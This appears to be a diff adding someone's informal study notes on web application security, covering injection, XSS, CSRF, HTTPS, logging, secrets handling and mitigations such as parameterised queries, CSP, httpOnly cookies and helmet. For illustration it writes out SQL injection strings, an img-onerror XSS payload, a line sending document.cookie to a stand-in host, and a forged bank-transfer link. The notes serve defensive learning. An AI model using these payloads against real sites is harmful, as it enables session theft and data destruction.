@@ -1,0 +1,129 @@
+u dont see the benefits of security after you lose money 
+
+star of security 
+
+authentication 
+dont trust anyone
+data management 
+access control 
+secure headers 
+code secrets 
+xss & csrf 
+https everywhere 
+logging
+3rd party libraries 
+injections
+
+
+
+injections - these are the most common attacks and leads to most financial loss and 50% of time if u are covering against injections u have covered a wide area
+ it means injecting code into another piece of code ' or 1=1--
+ '; DROP TABLE users; --
+
+ INSERT INTO sqlinjection (email) VALUES (''; DROP TABLE users; --);
+
+ anywhere a user can input something they can try injection
+
+ <img src= '/' onerror="alert('i chop')" > if in input it throws error dont use in .innerHTML use document.createTextNode(input)
+
+
+ to prevent injections 
+ sanitize input 
+ parametrize queries 
+ use knex.js or other orms
+
+ nsp npm package 
+ npm install -g nsp
+ nsp check - this shows the vulnerabilites with package.json 
+
+snyk - this audit node modules 
+
+snyk auth
+
+then 
+snyk test 
+
+loggging - it is all about getting information from your system one of the biggest security issues is insufficeint logging 
+these are great node loggers
+npm install winston 
+npm install morgan 
+
+log info as much as u can but be carefull to keep this info to the levels that have access to see this and dont log front end errors on console
+
+logs tell us only of mallicous event when it happens
+
+keep logging away from clients and users and info revealed would be used against ur app
+
+
+
+https everywhere -  sls and tls creates a secure tunnel that encrypts the information
+the bestway to get https in the early days u had to but ssl certs
+1 Let's Encrypt
+2 cloudflare - have a freetier if u host ur files with them they give you  https by defualt and also protect against ddos attack
+
+
+
+XSS & CSRF - it when an app include untrusted data in a webpage without escaping and valdiation or updating a webpage using user supplied data using javascript
+
+cross site scripting - running code cross site to different site from my browser
+
+what most bad actor would do is 
+
+window.location = 'haxxed.com?cookie=' + document.cookie
+
+visits a website and sends u the cookie to steal the user sign in data
+
+csrf - cross site request forgery- its creating a bad url that has mallicious code 
+
+e.g <a href="http://netbank.com/transfer.do?acc=AttackerA&amount;=$100">Read More!</a>
+
+we can set headers to increase security 
+
+self is ur host, the following website is those websites sallowed to run scripts
+create a cookie for a session
+res.cookie('session', '1', {httpOnly:true})
+res.cookie('session', '1', {secure:true})
+res.set({
+    'Content-Security-Policy': "script-src 'self' 'https://apis.google.com' " 
+})
+
+modern framework escape characters by default 
+
+good tips 
+do not use the eval() in js 
+no document.write()
+use content security policy 
+secure + HTTPOnly Cookies
+
+in node u can use a package called csurf to avoid these
+
+httponly prevent cookie access by cross site scripting it can be accessd by only http no js
+secure allow sending of cookies over only https
+
+
+
+code secrets the two things we want to focus on 
+environmental variables - store important data in env vars 
+commit history - never put ur secrets files in github because u have a commit history
+
+to have secure headers in our node app all we need is 
+npm install helmet
+
+
+
+
+access control - a key principle is least privilege always give the least amount of privilage possible only enough that people can do thier work
+spread this accross this leads to less attack points
+
+data management - never have one point of failure - that is if that fails u have no backup,
+encrypt data in transition and at rest even though its not feastible when data is in rest so do when transmitting 
+ in node we can use bcrypt, scrypt, aragon2
+
+ we want to use encryption for any data identifying users, access token and billing, and backup stored should be encrypted
+
+ pgcrypto - allows u to encrypt a few columns on ur postgres db
+
+
+ dont trust any one
+
+ add a rate limiter to prevent unnecessary requests
